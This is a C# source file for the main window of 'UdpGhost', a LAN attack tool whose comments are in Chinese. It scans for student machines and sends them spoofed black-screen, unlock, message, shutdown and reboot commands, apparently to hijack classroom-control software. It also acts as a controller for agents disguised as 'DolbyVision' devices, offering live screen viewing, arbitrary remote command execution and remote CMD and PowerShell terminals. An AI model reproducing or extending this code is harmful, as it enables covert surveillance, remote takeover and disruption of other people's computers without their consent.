using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows;
using System.Windows.Input;
using System.Windows.Media.Imaging;
using UdpGhost.Services;

namespace UdpGhost
{
    public partial class MainWindow : Window
    {
        private SingleStudentService _singleService;
        private string _localIP;

        // 屏幕监控相关
        private const int MonitorBroadcastPort = 9100;
        private List<MonitorSenderInfo> _monitorSenders = new List<MonitorSenderInfo>();
        private volatile bool _monitorWatching = false;
        private Thread _monitorWatchThread;

        public MainWindow()
        {
            InitializeComponent();
            try { this.Icon = new System.Windows.Media.Imaging.BitmapImage(new Uri("pack://application:,,,/UdpGhost;component/Assets/udp.ico")); } catch { }
            try
            {
                foreach (var ip in Dns.GetHostAddresses(Dns.GetHostName()))
                {
                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork && !IPAddress.IsLoopback(ip))
                    { _localIP = ip.ToString(); break; }
                }
            } catch { }
        }

        private void TitleBar_MouseDown(object sender, MouseButtonEventArgs e) { if (e.LeftButton == MouseButtonState.Pressed) this.DragMove(); }
        private void Close_Click(object sender, RoutedEventArgs e) { this.Close(); }
        private void Minimize_Click(object sender, RoutedEventArgs e) { this.WindowState = WindowState.Minimized; }
        private void Log(string msg) { LogBox.AppendText($"[{DateTime.Now:HH:mm:ss}] {msg}\n"); StatusText.Text = "Status: " + msg; }

        // ========== 扫描（学生端列表，两个Tab同步） ==========
        private async void Scan_Click(object sender, RoutedEventArgs e)
        {
            Log("正在扫描局域网...");
            SingleHostList.Items.Clear();
            AttackHostList.Items.Clear();
            var hosts = await System.Threading.Tasks.Task.Run(() => GhostService.ScanNetwork());
            foreach (var ip in hosts)
            {
                SingleHostList.Items.Add(ip);
                AttackHostList.Items.Add(ip);
            }
            Log($"扫描完成，发现 {hosts.Count} 台设备");
        }

        private void SingleHostList_DoubleClick(object sender, RoutedEventArgs e)
        { if (SingleHostList.SelectedItem != null) SingleIpBox.Text = SingleHostList.SelectedItem.ToString(); }
        private void HostList_DoubleClick(object sender, RoutedEventArgs e)
        { if (AttackHostList.SelectedItem != null) AttackIpBox.Text = AttackHostList.SelectedItem.ToString(); }

        // ========== 指定IP攻击区 ==========
        private string GetAttackTarget()
        {
            if (!string.IsNullOrWhiteSpace(AttackIpBox.Text)) return AttackIpBox.Text.Trim();
            if (AttackHostList.SelectedItem != null) return AttackHostList.SelectedItem.ToString();
            return null;
        }

        private bool CheckAttackChannel(out int channel)
        {
            channel = 1;
            if (!int.TryParse(AttackChannelBox.Text, out channel) || channel < 1 || channel > 32)
            { MessageBox.Show("频道号1-32"); return false; }
            return true;
        }

        private void Blackscreen_Click(object sender, RoutedEventArgs e)
        {
            if (!CheckAttackChannel(out int channel)) return;
            string ip = GetAttackTarget();
            if (ip == null) { MessageBox.Show("请输入或选择学生端IP"); return; }
            string text = BlackText.Text.Trim();
            if (string.IsNullOrEmpty(text)) text = null;
            Log(GhostService.SendBlackscreen(ip, channel, true, 5, text));
        }
        private void Unlock_Click(object sender, RoutedEventArgs e)
        {
            if (!CheckAttackChannel(out int channel)) return;
            string ip = GetAttackTarget();
            if (ip == null) { MessageBox.Show("请输入或选择学生端IP"); return; }
            Log(GhostService.SendUnlock(ip, channel));
        }
        private void SendMsg_Click(object sender, RoutedEventArgs e)
        {
            string ip = GetAttackTarget();
            if (ip == null) { MessageBox.Show("请输入或选择学生端IP"); return; }
            var dlg = new MessageDialog { Owner = this };
            if (dlg.ShowDialog() == true && !string.IsNullOrWhiteSpace(dlg.Message))
                Log(GhostService.SendText(ip, 4705, dlg.Message));
        }
        private void Shutdown_Click(object sender, RoutedEventArgs e)
        {
            string ip = GetAttackTarget();
            if (ip == null) { MessageBox.Show("请输入或选择学生端IP"); return; }
            if (MessageBox.Show($"确认向 {ip} 发送关机？", "确认", MessageBoxButton.YesNo) != MessageBoxResult.Yes) return;
            Log(GhostService.SendShutdown(ip));
        }
        private void Reboot_Click(object sender, RoutedEventArgs e)
        {
            string ip = GetAttackTarget();
            if (ip == null) { MessageBox.Show("请输入或选择学生端IP"); return; }
            if (MessageBox.Show($"确认向 {ip} 发送重启？", "确认", MessageBoxButton.YesNo) != MessageBoxResult.Yes) return;
            Log(GhostService.SendReboot(ip));
        }

        // ========== 单学生连接区 ==========
        private void SingleConnect_Click(object sender, RoutedEventArgs e)
        {
            string ip = string.IsNullOrWhiteSpace(SingleIpBox.Text) ? null : SingleIpBox.Text.Trim();
            if (ip == null && SingleHostList.SelectedItem != null) ip = SingleHostList.SelectedItem.ToString();
            if (ip == null) { MessageBox.Show("请输入或选择学生端IP"); return; }
            if (!int.TryParse(SingleChannelBox.Text, out int channel) || channel < 1 || channel > 32)
            { MessageBox.Show("频道号1-32"); return; }
            if (string.IsNullOrEmpty(_localIP)) { MessageBox.Show("无法获取本机IP"); return; }

            try
            {
                _singleService = new SingleStudentService(_localIP, channel);
                _singleService.OnLog += (msg) => Dispatcher.Invoke(() => Log(msg));
                _singleService.OnConnected += (tgt) => Dispatcher.Invoke(() =>
                {
                    SingleConnStatus.Text = "已连接 " + tgt;
                    SingleConnStatus.Foreground = System.Windows.Media.Brushes.LimeGreen;
                    BtnSingleConnect.IsEnabled = false;
                    BtnSingleDisconnect.IsEnabled = true;
                    SetSingleOpsEnabled(true);
                    Log("[单学生] 连接成功: " + tgt);
                });
                _singleService.OnDisconnected += (tgt) => Dispatcher.Invoke(() =>
                {
                    SingleConnStatus.Text = "已断开";
                    SingleConnStatus.Foreground = System.Windows.Media.Brushes.OrangeRed;
                    BtnSingleConnect.IsEnabled = true;
                    BtnSingleDisconnect.IsEnabled = false;
                    SetSingleOpsEnabled(false);
                    Log("[单学生] 连接断开: " + tgt);
                });
                _singleService.Start(ip, channel, "UdpGhost");
                Log("[单学生] 正在连接 " + ip + " 频道" + channel + "...");
            }
            catch (Exception ex)
            {
                Log("[单学生] 连接失败: " + ex.Message);
                MessageBox.Show("连接失败: " + ex.Message);
            }
        }

        private void SingleDisconnect_Click(object sender, RoutedEventArgs e)
        {
            try { _singleService?.Stop(); } catch { }
            Log("[单学生] 已断开");
        }

        private void SetSingleOpsEnabled(bool enabled)
        {
            BtnSingleBlack.IsEnabled = enabled;
            BtnSingleUnlock.IsEnabled = enabled;
            BtnSingleMsg.IsEnabled = enabled;
            BtnSingleShutdown.IsEnabled = enabled;
            BtnSingleReboot.IsEnabled = enabled;
        }

        private void SingleBlack_Click(object sender, RoutedEventArgs e)
        {
            if (_singleService == null || !_singleService.IsConnected) { MessageBox.Show("未连接"); return; }
            string text = SingleBlackText.Text.Trim();
            if (string.IsNullOrEmpty(text)) text = null;
            bool ok = _singleService.SendBlackScreen(text);
            Log(ok ? "[单播] 黑屏已发送" : "[单播] 黑屏发送失败");
        }
        private void SingleUnlock_Click(object sender, RoutedEventArgs e)
        {
            if (_singleService == null || !_singleService.IsConnected) { MessageBox.Show("未连接"); return; }
            bool ok = _singleService.SendUnlock();
            Log(ok ? "[单播] 解锁已发送" : "[单播] 解锁发送失败");
        }
        private void SingleMsg_Click(object sender, RoutedEventArgs e)
        {
            if (_singleService == null || !_singleService.IsConnected) { MessageBox.Show("未连接"); return; }
            var dlg = new MessageDialog { Owner = this };
            if (dlg.ShowDialog() == true && !string.IsNullOrWhiteSpace(dlg.Message))
            {
                bool ok = _singleService.SendMessage(dlg.Message);
                Log(ok ? "[单播] 消息已发送" : "[单播] 消息发送失败");
            }
        }
        private void SingleShutdown_Click(object sender, RoutedEventArgs e)
        {
            if (_singleService == null || !_singleService.IsConnected) { MessageBox.Show("未连接"); return; }
            if (MessageBox.Show("确认向目标发送关机？", "确认", MessageBoxButton.YesNo) != MessageBoxResult.Yes) return;
            bool ok = _singleService.SendShutdown();
            Log(ok ? "[单播] 关机已发送" : "[单播] 关机发送失败");
        }
        private void SingleReboot_Click(object sender, RoutedEventArgs e)
        {
            if (_singleService == null || !_singleService.IsConnected) { MessageBox.Show("未连接"); return; }
            if (MessageBox.Show("确认向目标发送重启？", "确认", MessageBoxButton.YesNo) != MessageBoxResult.Yes) return;
            bool ok = _singleService.SendReboot();
            Log(ok ? "[单播] 重启已发送" : "[单播] 重启发送失败");
        }

        // ========== 屏幕监控（集成在主界面） ==========
        private async void MonitorScan_Click(object sender, RoutedEventArgs e)
        {
            _monitorSenders.Clear();
            MonitorSenderList.Items.Clear();
            Log("[监控] 正在扫描DolbyVision设备...");

            await System.Threading.Tasks.Task.Run(() =>
            {
                try
                {
                    using (var client = new UdpClient(MonitorBroadcastPort))
                    {
                        client.Client.ReceiveTimeout = 3000;
                        var endPoint = new IPEndPoint(IPAddress.Any, MonitorBroadcastPort);
                        DateTime start = DateTime.Now;
                        while ((DateTime.Now - start).TotalSeconds < 3)
                        {
                            try
                            {
                                byte[] data = client.Receive(ref endPoint);
                                string msg = Encoding.UTF8.GetString(data);
                                string[] parts = msg.Split('|');
                                if (parts.Length >= 4 && parts[0] == "DV")
                                {
                                    var info = new MonitorSenderInfo
                                    {
                                        MachineName = parts[1],
                                        IP = parts[2],
                                        VideoPort = int.Parse(parts[3]),
                                        CmdPort = parts.Length > 4 ? int.Parse(parts[4]) : 9102,
                                        TerminalPort = parts.Length > 5 ? int.Parse(parts[5]) : 9103
                                    };
                                    if (!_monitorSenders.Exists(s => s.IP == info.IP))
                                    {
                                        _monitorSenders.Add(info);
                                        Dispatcher.Invoke(() =>
                                        {
                                            MonitorSenderList.Items.Add($"{info.MachineName} ({info.IP})");
                                        });
                                    }
                                }
                            }
                            catch { }
                        }
                    }
                }
                catch { }
            });
            Log($"[监控] 扫描完成，发现 {_monitorSenders.Count} 台设备");
        }

        private void MonitorList_DoubleClick(object sender, MouseButtonEventArgs e)
        {
            if (MonitorSenderList.SelectedIndex < 0) return;
            var info = _monitorSenders[MonitorSenderList.SelectedIndex];
            StartMonitorWatching(info);
        }

        private MonitorSenderInfo GetMonitorSelected()
        {
            if (MonitorSenderList.SelectedIndex < 0) return null;
            return _monitorSenders[MonitorSenderList.SelectedIndex];
        }

        private void RemoteShutdown_Click(object sender, RoutedEventArgs e)
        {
            var info = GetMonitorSelected();
            if (info == null) { MessageBox.Show("请先选择设备"); return; }
            if (MessageBox.Show($"确认远程关机 {info.MachineName} ({info.IP})？", "确认", MessageBoxButton.YesNo) != MessageBoxResult.Yes) return;
            string result = SendMonitorCommand(info, "SHUTDOWN");
            Log("[远程] 关机: " + result);
        }

        private void RemoteReboot_Click(object sender, RoutedEventArgs e)
        {
            var info = GetMonitorSelected();
            if (info == null) { MessageBox.Show("请先选择设备"); return; }
            if (MessageBox.Show($"确认远程重启 {info.MachineName} ({info.IP})？", "确认", MessageBoxButton.YesNo) != MessageBoxResult.Yes) return;
            string result = SendMonitorCommand(info, "REBOOT");
            Log("[远程] 重启: " + result);
        }

        private void RemoteCmd_Click(object sender, RoutedEventArgs e)
        {
            var info = GetMonitorSelected();
            if (info == null) { MessageBox.Show("请先选择设备"); return; }
            var dlg = new MessageDialog { Owner = this };
            if (dlg.ShowDialog() == true && !string.IsNullOrWhiteSpace(dlg.Message))
            {
                string result = SendMonitorCommand(info, "EXEC:" + dlg.Message);
                MessageBox.Show(result, "远程命令结果");
            }
        }

        private void RemoteWatch_Click(object sender, RoutedEventArgs e)
        {
            var info = GetMonitorSelected();
            if (info == null) { MessageBox.Show("请先选择设备"); return; }
            StartMonitorWatching(info);
        }

        private void RemoteCmdTerminal_Click(object sender, RoutedEventArgs e)
        {
            var info = GetMonitorSelected();
            if (info == null) { MessageBox.Show("请先选择设备"); return; }
            var term = new TerminalWindow(info.IP, info.TerminalPort, info.MachineName, "CMD");
            term.Owner = this;
            term.Show();
        }

        private void RemotePsTerminal_Click(object sender, RoutedEventArgs e)
        {
            var info = GetMonitorSelected();
            if (info == null) { MessageBox.Show("请先选择设备"); return; }
            var term = new TerminalWindow(info.IP, info.TerminalPort, info.MachineName, "PS");
            term.Owner = this;
            term.Show();
        }

        private string SendMonitorCommand(MonitorSenderInfo info, string cmd)
        {
            try
            {
                using (var client = new TcpClient())
                {
                    client.ReceiveTimeout = 5000;
                    client.Connect(info.IP, info.CmdPort);
                    using (NetworkStream stream = client.GetStream())
                    {
                        byte[] data = Encoding.UTF8.GetBytes(cmd);
                        stream.Write(data, 0, data.Length);
                        stream.Flush();
                        byte[] buffer = new byte[8192];
                        int read = stream.Read(buffer, 0, buffer.Length);
                        if (read > 0) return Encoding.UTF8.GetString(buffer, 0, read);
                        return "无响应";
                    }
                }
            }
            catch (Exception ex) { return "错误: " + ex.Message; }
        }

        private void StartMonitorWatching(MonitorSenderInfo info)
        {
            _monitorWatching = false;
            if (_monitorWatchThread != null && _monitorWatchThread.IsAlive) _monitorWatchThread.Join(500);
            _monitorWatching = true;
            _monitorWatchThread = new Thread(() => MonitorWatchLoop(info)) { IsBackground = true };
            _monitorWatchThread.Start();
            Log("[监控] 开始观看 " + info.MachineName);
        }

        private void MonitorWatchLoop(MonitorSenderInfo info)
        {
            try
            {
                using (var client = new TcpClient())
                {
                    client.Connect(info.IP, info.VideoPort);
                    using (NetworkStream stream = client.GetStream())
                    {
                        byte[] buffer = new byte[65536];
                        MemoryStream jpegStream = new MemoryStream();
                        bool inJpeg = false;
                        while (_monitorWatching && client.Connected)
                        {
                            int read = stream.Read(buffer, 0, buffer.Length);
                            if (read <= 0) break;
                            for (int i = 0; i < read; i++)
                            {
                                if (!inJpeg)
                                {
                                    if (buffer[i] == 0xFF && i + 1 < read && buffer[i + 1] == 0xD8)
                                    { inJpeg = true; jpegStream = new MemoryStream(); jpegStream.WriteByte(buffer[i]); }
                                }
                                else
                                {
                                    jpegStream.WriteByte(buffer[i]);
                                    if (buffer[i] == 0xD9 && i >= 1 && buffer[i - 1] == 0xFF)
                                    {
                                        inJpeg = false;
                                        byte[] jpegData = jpegStream.ToArray();
                                        Dispatcher.Invoke(() =>
                                        {
                                            try
                                            {
                                                var img = new BitmapImage();
                                                img.BeginInit();
                                                img.StreamSource = new MemoryStream(jpegData);
                                                img.CacheOption = BitmapCacheOption.OnLoad;
                                                img.EndInit();
                                                img.Freeze();
                                                MonitorVideoImage.Source = img;
                                            }
                                            catch { }
                                        });
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch { }
        }

        protected override void OnClosed(EventArgs e)
        {
            try { _singleService?.Stop(); } catch { }
            try { _singleService?.Dispose(); } catch { }
            _monitorWatching = false;
            base.OnClosed(e);
        }
    }

    internal class MonitorSenderInfo
    {
        public string MachineName { get; set; }
        public string IP { get; set; }
        public int VideoPort { get; set; }
        public int CmdPort { get; set; }
        public int TerminalPort { get; set; }
    }
}
